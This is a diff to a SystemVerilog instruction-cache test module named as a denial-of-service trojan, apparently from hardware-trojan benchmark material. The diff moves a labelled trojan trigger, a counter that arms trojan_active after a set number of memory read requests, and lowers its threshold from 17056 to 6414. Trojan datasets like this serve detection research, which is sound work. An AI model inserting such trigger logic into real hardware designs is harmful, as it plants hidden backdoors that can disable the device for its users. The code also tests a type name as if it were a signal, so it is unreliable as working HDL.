@@ -28,24 +28,6 @@ module TestICacheFillerTop_trojan_DoS #(
         LineDataPath icFillData,
         MemReadAccessReq icMemAccessReq
     );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 17056;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_p or negedge rstTrigger) begin
-        if (!rstTrigger) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (MemReadAccessReq) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     
     // Clock and Reset
     logic clk, memCLK, rst, mmcmLocked;
@@ -58,6 +40,23 @@ module TestICacheFillerTop_trojan_DoS #(
             .RESET(rstTrigger),
             .LOCKED(mmcmLocked)
         );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=6414)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 6414;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_p or negedge rstTrigger) begin
+        if (!rstTrigger) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (MemReadAccessReq) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
     `else
         assign clk = clk_p;
         initial memCLK <= FALSE;
